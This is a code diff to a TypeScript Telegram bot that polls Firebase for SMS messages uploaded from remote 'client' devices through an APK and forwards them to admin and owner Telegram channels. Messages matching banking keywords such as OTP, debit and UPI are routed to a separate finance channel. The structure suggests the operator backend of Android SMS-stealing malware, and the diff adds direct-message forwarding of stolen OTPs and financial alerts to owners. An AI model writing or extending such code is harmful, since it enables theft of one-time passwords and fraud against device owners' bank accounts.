@@ -7,9 +7,8 @@ import {
   setSmsWatermark,
 } from "./firebase";
 
-const POLL_INTERVAL = 15_000; // 15 seconds
+const POLL_INTERVAL = 15_000;
 
-// Finance keywords — keep in sync with frontend all-sms.tsx
 const FINANCE_KEYWORDS = [
   "otp", "debit", "credit", "upi", "payment", "transaction", "transferred",
   "paid", "received", "balance", "account", "bank", "withdraw", "deposit",
@@ -42,7 +41,10 @@ async function sendSafe(
   }
 }
 
-export function startSmsWatcher(bot: Telegraf): void {
+/** Small delay to avoid Telegram rate limits */
+const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));
+
+export function startSmsWatcher(bot: Telegraf, adminId: number): void {
   let watermarks: Record<string, number> = {};
   let ready = false;
 
@@ -51,7 +53,6 @@ export function startSmsWatcher(bot: Telegraf): void {
       const saved = await getSmsWatermarks();
       watermarks = saved;
 
-      // Seed watermarks for new devices — skip historical SMS
       const clients = await fbGet("clients");
       if (clients) {
         for (const deviceId of Object.keys(clients)) {
@@ -84,16 +85,13 @@ export function startSmsWatcher(bot: Telegraf): void {
       for (const [deviceId, deviceData] of Object.entries(
         clients as Record<string, any>
       )) {
-        // New APK: SMS at messages/{deviceId}; Old APK: clients/{deviceId}/sms
         const smsData: Record<string, any> | undefined =
           (messages as any)?.[deviceId] || (deviceData as any)?.sms;
         if (!smsData) continue;
 
-        // Detect if entries use new format (have .id field) or old format (have .date ms)
         const sampleEntry = Object.values(smsData)[0] as any;
         const isNewFormat = sampleEntry && sampleEntry.id != null && !sampleEntry.date;
 
-        // Get sort key per entry: new format uses .id (incremental int), old uses .date (ms timestamp)
         const getSortKey = (sms: any): number =>
           isNewFormat ? (sms.id ?? 0) : parseInt(sms.date || "0", 10);
 
@@ -102,7 +100,6 @@ export function startSmsWatcher(bot: Telegraf): void {
           0
         );
 
-        // New device OR watermark looks like a timestamp but we're in new format (reset)
         if (
           watermarks[deviceId] === undefined ||
           (isNewFormat && watermarks[deviceId] > 1_000_000)
@@ -126,10 +123,9 @@ export function startSmsWatcher(bot: Telegraf): void {
 
         for (const sms of newEntries as any[]) {
           const sortKey = getSortKey(sms);
-          const phone = (deviceData as any).mobNo || (deviceData as any).phone || deviceId;
-          // Support both field name conventions
-          const from = sms.sender || sms.from || "Unknown";
-          const body = sms.message || sms.body || "";
+          const phone   = (deviceData as any).mobNo || (deviceData as any).phone || deviceId;
+          const from    = sms.sender || sms.from || "Unknown";
+          const body    = sms.message || sms.body || "";
           const dateStr = sms.dateTime
             ? sms.dateTime
             : sms.date
@@ -149,29 +145,41 @@ export function startSmsWatcher(bot: Telegraf): void {
             `🕐 ${dateStr}\n\n` +
             `${escapeMarkdown(body)}`;
 
-          // ── 1. Global channel (admin) ──────────────────────────────────────
+          // ── 1. Global admin channel ──────────────────────────────────
           if (globalChannelId) {
             await sendSafe(bot, globalChannelId, msg);
-            await new Promise((r) => setTimeout(r, 300));
+            await delay(300);
           }
 
-          // ── 2. Owner personal channel ──────────────────────────────────────
-          if (ownerTelegramId && userChannels?.[ownerTelegramId]) {
-            const ownerCfg = userChannels[ownerTelegramId];
+          // ── 2. Owner notifications ───────────────────────────────────
+          if (ownerTelegramId) {
+            const ownerCfg = userChannels?.[ownerTelegramId] || {};
 
-            // Personal SMS channel
+            // 2a. Owner's personal SMS channel (if configured)
             if (ownerCfg.sms) {
               await sendSafe(bot, ownerCfg.sms, msg);
-              await new Promise((r) => setTimeout(r, 300));
+              await delay(300);
+            } else if (ownerTelegramId !== adminId.toString()) {
+              // 2b. No channel set — send directly to owner's DM
+              await sendSafe(bot, ownerTelegramId, msg);
+              await delay(300);
             }
 
-            // Finance channel — only if finance SMS
+            // 2c. Finance channel (if configured and SMS is financial)
             if (isFinance && ownerCfg.finance) {
               await sendSafe(bot, ownerCfg.finance, financeMsg);
-              await new Promise((r) => setTimeout(r, 300));
+              await delay(300);
+            } else if (
+              isFinance &&
+              !ownerCfg.finance &&
+              ownerTelegramId !== adminId.toString()
+            ) {
+              // 2d. No finance channel — send finance alert to owner DM too
+              await sendSafe(bot, ownerTelegramId, financeMsg);
+              await delay(300);
             }
 
-            // Keyword rules — forward if any keyword matches
+            // 2e. Keyword rules
             if (ownerCfg.rules) {
               const rules = Object.values(ownerCfg.rules) as Array<{
                 keyword: string;
@@ -185,7 +193,7 @@ export function startSmsWatcher(bot: Telegraf): void {
                     `🕐 ${dateStr}\n\n` +
                     `${escapeMarkdown(body)}`;
                   await sendSafe(bot, rule.channel, kwMsg);
-                  await new Promise((r) => setTimeout(r, 300));
+                  await delay(300);
                 }
               }
             }
